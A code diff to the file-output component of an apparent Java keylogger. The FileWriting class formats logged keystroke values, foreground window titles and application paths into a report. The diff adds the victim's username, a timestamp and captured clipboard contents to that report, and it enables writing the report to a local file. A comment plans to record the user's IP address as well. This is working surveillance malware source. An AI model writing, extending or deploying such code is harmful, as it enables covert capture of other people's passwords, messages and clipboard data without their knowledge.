@@ -1,7 +1,7 @@
 import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
-import java.util.Arrays;
+import java.time.format.DateTimeFormatter;
 import java.util.HashMap;
 import java.util.Objects;
 import java.util.TimerTask;
@@ -14,6 +14,10 @@ public class FileWriting extends TimerTask {
         if (map.size() == 0) return;
         BalancedBST tree = KeyLogger.balancedBST;
         StringBuilder result = new StringBuilder();
+        result.append("From UserName : ").append(System.getProperty("user.name")).append("\n");
+        // append the user ip address
+        // append the current zoned date time to the result
+        result.append("At time : ").append(java.time.ZonedDateTime.now().format(DateTimeFormatter.ofPattern("dd/MM/yyyy hh:mm:ss a z"))).append("\n");
         result.append(print());
         result.append(String.format("%7s |      %-20s   |    %-19s   | %-32s | %-50s | %-20s |\n", "Index", "Date/Time", "    Source", "  Title/Description", "Values", "Clipboard"));
         result.append(print());
@@ -27,13 +31,13 @@ public class FileWriting extends TimerTask {
             int treeKeyValue = tree.modifiedSearch(index);
             int hashMapKeyValue = Integer.parseInt(Objects.requireNonNull(returnKey(map, map.get(index))));
             String string = tree.search(treeKeyValue).split(",")[0];
-            String truncateTitle = truncate(arr[1], 14);
-            String[] getProgramName = arr[2].split("\\\\");// hello from intellij.
+            String truncateTitle = truncate(arr[1].split("\r")[0], 14); // reading only the first line of the title
+            String[] getProgramName = arr[2].split("\\\\");
             String programName = getProgramName[getProgramName.length - 1];
             String programWidth = "23";
             if (programName.length() < 23) programWidth = "24";
             result.append(String.format("%7d | %-10s | %-" + programWidth + "s | %-32s | %-50s | %-20s |\n", index, arr[0], programName,
-                    truncateTitle + "...<KeyValue=" + hashMapKeyValue + ">", truncate(string, 35) + "...<KeyValue=" + treeKeyValue + ">", "Clipboard Items"));
+                    truncateTitle + "...<KeyValue=" + hashMapKeyValue + ">", truncate(string, 30) + "...<KeyValue=" + treeKeyValue + ">", truncate(arr[3], 17) + "..."));
             result.append(print());
         }
         result.append("\n************************************************************* Foreground Windows Title Descriptions && Values ********************************************************************************\n");
@@ -46,16 +50,17 @@ public class FileWriting extends TimerTask {
             result.append("\n\t\tDate/Time: ").append(arr[0]);
             result.append("\n\t\tTitle: ").append(arr[1]);
             result.append("\n\t\tApplication Path: ").append(arr[2]);
+            result.append("\n\t\tClipboard: ").append(arr[3]);
             result.append("\n\t\t[TreeKeyValue=").append(treeKeyValue).append("]:\n\t\t\t").append(tree.search(treeKeyValue));
-            result.append(String.format("\n%-30s+--------------------------------------------------------+",""));
+            result.append(String.format("\n%-30s+--------------------------------------------------------+", ""));
         }
         result.append("\n************************************************************* End ********************************************************************************************\n");
         System.out.println(result);
-//        try (FileWriter fw = new FileWriter(new File(".\\src\\win.txt"), false)) {
-//            fw.write(result.toString());
-//        } catch (IOException e) {
-//            throw new RuntimeException(e);
-//        }
+        try (FileWriter fw = new FileWriter(new File(".\\src\\win.txt"), false)) {
+            fw.write(result.toString());
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
     }
 
     public static String truncate(String str, int length) {
